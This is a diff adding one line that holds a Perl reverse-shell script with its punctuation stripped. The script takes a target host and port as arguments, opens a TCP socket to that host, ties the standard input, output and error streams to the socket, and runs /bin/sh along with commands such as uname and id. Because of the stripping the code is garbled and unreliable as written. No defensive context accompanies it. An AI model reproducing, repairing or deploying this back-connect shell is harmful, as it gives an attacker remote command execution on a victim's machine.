@@ -1,0 +1,1 @@
+usrbinperl use socket cmd lynx system echo uname aecho idbinsh 0cmd targetargv0 portargv1 iaddrinet_atontarget dieerror n paddrsockaddr_inport iaddr dieerror n protogetprotobynametcp socketsocket pf_inet sock_stream proto dieerror n connectsocket paddr dieerror n openstdin socket openstdout socket openstderr socket systemsystem closestdin closestdout closestderr
